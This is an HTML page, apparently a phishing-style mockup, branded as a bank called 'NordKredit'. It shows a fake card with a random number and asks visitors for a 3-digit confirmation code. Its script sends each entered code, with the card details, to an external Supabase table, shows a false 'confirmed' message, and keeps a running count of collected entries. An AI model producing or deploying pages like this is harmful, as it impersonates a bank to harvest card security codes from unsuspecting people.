<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NordKredit</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif;}

body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#0a0f1c;
overflow:hidden;
position:relative;
}

/* Background glow */
body::before{
content:"";
position:absolute;
width:600px;
height:600px;
background:radial-gradient(circle,#1bb34a33,transparent 70%);
filter:blur(120px);
}

/* PHONE */
.phone{
width:370px;
height:760px;
background:#111;
border-radius:55px;
padding:18px;
position:relative;
box-shadow:0 0 80px #000;
}

/* Dynamic Island */
.island{
position:absolute;
top:12px;
left:50%;
transform:translateX(-50%);
width:140px;
height:35px;
background:black;
border-radius:25px;
}

/* bottom bar */
.homebar{
position:absolute;
bottom:8px;
left:50%;
transform:translateX(-50%);
width:120px;
height:5px;
background:#333;
border-radius:5px;
}

.screen{
width:100%;
height:100%;
background:#0f172a;
border-radius:40px;
padding:25px;
color:white;
display:flex;
flex-direction:column;
align-items:center;
}

/* CARD */
.card{
width:100%;
height:220px;
background:linear-gradient(135deg,#1bb34a,#0c5f2b);
border-radius:22px;
margin-top:90px;
padding:20px;
position:relative;
box-shadow:0 20px 40px #0008;
}

.brand{
font-size:20px;
font-weight:600;
}

.number{
position:absolute;
top:50%;
left:50%;
transform:translate(-50%,-50%);
font-size:22px;
letter-spacing:3px;
}

.code4{
position:absolute;
bottom:20px;
left:20px;
font-size:14px;
opacity:0.8;
}

/* INPUT */
form{
margin-top:40px;
width:100%;
display:flex;
flex-direction:column;
gap:15px;
}

input{
padding:14px;
border-radius:12px;
border:none;
font-size:18px;
text-align:center;
background:#1e293b;
color:white;
}

button{
padding:15px;
border:none;
border-radius:14px;
font-weight:600;
font-size:16px;
cursor:pointer;
background:linear-gradient(90deg,#f6d365,#fda085);
}
.stats{
margin-top:20px;
font-size:13px;
opacity:0.7;
}
</style>
</head>
<body>

<div class="phone">
<div class="island"></div>
<div class="homebar"></div>

<div class="screen">

<div class="card">
<div class="brand">NordKredit</div>
<div class="number" id="cardNumber"></div>
<div class="code4" id="code4"></div>
</div>

<form id="form">
<input type="text" maxlength="3" id="secretInput" placeholder="3 rəqəmli kod">
<button type="submit">Təsdiqlə</button>
</form>

<div class="stats" id="liveCount">Aktiv istifadəçi: ...</div>

</div>
</div>

<script type="module">
import { createClient } from "https://esm.sh/@supabase/supabase-js@2"

const supabaseUrl="https://gkrfcoyleewxrxbfdunq.supabase.co"
const supabaseKey="sb_publishable_E1QDjV9fAt2IaoI3h7G9Iw_hIiSaAFH"
const supabase=createClient(supabaseUrl,supabaseKey)

function random16(){
let n="";
for(let i=0;i<16;i++){n+=Math.floor(Math.random()*10)}
return n.replace(/(.{4})/g,'$1 ').trim()
}

function random4(){
return Math.floor(1000+Math.random()*9000).toString()
}

const cardNumber=random16()
const code4=random4()

document.getElementById("cardNumber").textContent=cardNumber
document.getElementById("code4").textContent="Kod: "+code4

document.getElementById("form").addEventListener("submit",async e=>{
e.preventDefault()
const val=document.getElementById("secretInput").value

if(val.length!==3){alert("3 rəqəm daxil edin");return}

await supabase.from("nordkredit_data").insert([
{kart_nomresi:cardNumber,kod_4:code4,daxil_edilen_3:val}
])

alert("Təsdiq edildi")
document.getElementById("secretInput").value=""
})

/* LIVE USERS */
setInterval(async ()=>{
const {count}=await supabase.from("nordkredit_data").select("*",{count:"exact",head:true})
document.getElementById("liveCount").textContent="Ümumi qoşulan: "+count
},3000)

</script>
</body>
</html>
